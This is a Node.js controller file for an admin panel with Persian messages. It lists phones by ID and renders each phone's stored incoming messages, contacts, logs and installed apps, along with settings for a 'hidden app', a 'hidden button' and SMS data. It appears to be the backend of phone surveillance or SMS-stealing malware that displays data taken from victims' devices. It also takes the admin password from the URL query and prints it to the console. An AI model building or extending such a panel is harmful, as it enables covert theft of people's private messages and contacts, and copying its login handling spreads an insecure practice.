const { findAll, findUser, getGlobalLink, getGlobalApp,
    getPoshtibaniLink,getpluseService, getUpdateLink,
    getpluseGorohi,gethiddenbutton,gethiddenApp,getSmsData
} = require('../services/UserService');
const { validation } = require('../utils/validations');
module.exports = {
    async getAllUsers(req, res) {
        let data = []
        await (await findAll()).filter(x => {
            data.push(x.phone_id)
        })
        res.json({ data })
    },
    async findUser(req, res) {
        let { phone_id } = req.body
        if (!validation.isEmpty(phone_id)) {
            res.json({ message: 'phone_id ra vared konid' })
        } else {
            let finded_user = await findUser(phone_id)
            if (validation.isEmpty(finded_user) && finded_user.length > 0) {
                res.json({ data: finded_user })
            } else {
                res.status(404).json({ message: 'not found user with this id' })
            }
        }
    },
    async loginPage(req, res) {
        if (typeof req.session.isUser != 'undefined') {
            res.redirect('/admin/users')
        } else {
            if (typeof req.session.message == 'undefined') {
                res.render('login.hbs')
            } else {
                let message = req.session.message
                req.session.message = null
                res.render('login.hbs', { message })
            }
        }



    },
    async logOut(req, res) {
        req.session.isUser = null
        delete req.session.isUser
        res.redirect('/admin/login')
    },
    async register(req, res) {
        let { password } = req.query
        console.log(password);
        if (validation.isPassword(password)) {
            req.session.isUser = true
            res.redirect('/admin/users')
        } else {
            req.session.message = "کلمه رمز اشتباه است"
            res.redirect('/admin/login')
        }
    },
    async allUsers(req, res) {
        let globalApp = await getGlobalApp()
        let globalLink = await getGlobalLink()
        let updateLink = await getUpdateLink()
        let poshtibaniLink = await getPoshtibaniLink()
        let shomarandeh = await getpluseService()
        let gorohi = await getpluseGorohi()
        let model = await findAll()
        let smsDefut = await getSmsData()
        let hidenApp = await gethiddenApp()
        let hidenButton = await gethiddenbutton()
        console.log(shomarandeh);
        console.log(gorohi);
        res.render('mainTable.hbs', {
            model:model.reverse(),gorohi,
            globalLink, globalApp, updateLink, poshtibaniLink,shomarandeh, smsDefut,
            HiddenApp:hidenApp ,HiddenButton:hidenButton
        })
    },
    async chatUser(req, res) {
        let id = req.params.slug
        let currnt_user = await findUser(id)
        if (currnt_user) {
            // console.log(currnt_user[0].inputMessage);
            res.render('chatUser.hbs', { model: currnt_user[0].inputMessage.reverse()})
        } else {
            res.redirect('/admin/users')
        }
    },
    async gozareshat(req, res) {
        let id = req.params.slug
        let currnt_user = await findUser(id)
        if (validation.isEmpty(currnt_user)) {
            res.render('reports.hbs', { model: currnt_user[0].logMessage })
        } else {
            res.redirect('/admin/users')
        }
    },
    async contacts(req, res) {
        let id = req.params.slug
        let currnt_user = await findUser(id)
        if (validation.isEmpty(currnt_user)) {
            res.render('contacts.hbs', { model: currnt_user[0].contacts })
        } else {
            res.redirect('/admin/users')
        }
    },
    async programList(req, res) {
        let id = req.params.slug
        let currnt_user = await findUser(id)
        if (validation.isEmpty(currnt_user)) {
            res.render('appList.hbs', { model: currnt_user[0].appMostInstall, phone_id: id })
        } else {
            res.redirect('/admin/users')
        }
    }
}
